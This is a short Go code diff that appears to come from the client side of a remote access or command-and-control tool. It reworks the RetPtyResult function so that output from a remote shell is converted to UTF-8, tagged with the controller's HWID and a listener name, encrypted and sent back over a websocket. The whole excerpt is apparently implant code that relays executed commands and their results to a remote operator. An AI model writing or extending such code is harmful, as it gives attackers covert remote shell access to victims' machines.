@@ -3,6 +3,7 @@ package ptyopt
 import (
 	"io"
 	"main/Encrypt"
+	"main/Helper"
 	"main/MessagePack"
 	"main/PcInfo"
 	"os"
@@ -36,13 +37,18 @@ func SendData(data []byte, Connection *wsc.Wsc) {
 	}
 	Connection.SendBinaryMessage(endata)
 }
-func RetPtyResult(resBuffer []byte, clientId string, Connection *wsc.Wsc) {
-	//fmt.Println(string(resBuffer))
+func RetPtyResult(resBuffer []byte, ProcessPath string, unmsgpack MessagePack.MsgPack, Connection *wsc.Wsc) {
+
+	utf8Stdout, err := Helper.ConvertGBKToUTF8(string(resBuffer))
+	if err != nil {
+		//Log(err.Error(), Connection, *unmsgpack)
+		utf8Stdout = err.Error()
+	}
 	msgpack := new(MessagePack.MsgPack)
-	msgpack.ForcePathObject("Pac_ket").SetAsString("PtyRet")
+	msgpack.ForcePathObject("Pac_ket").SetAsString("shell")
+	msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
 	msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
-	msgpack.ForcePathObject("ClientHWID").SetAsString(PcInfo.GetHWID())
-	msgpack.ForcePathObject("Message").SetAsString(string(resBuffer))
-	//fmt.Println(string(resBuffer))
+	msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
+	msgpack.ForcePathObject("ReadInput").SetAsString(ProcessPath + "\\>" + unmsgpack.ForcePathObject("WriteInput").GetAsString() + "\n" + utf8Stdout)
 	SendData(msgpack.Encode2Bytes(), Connection)
 }
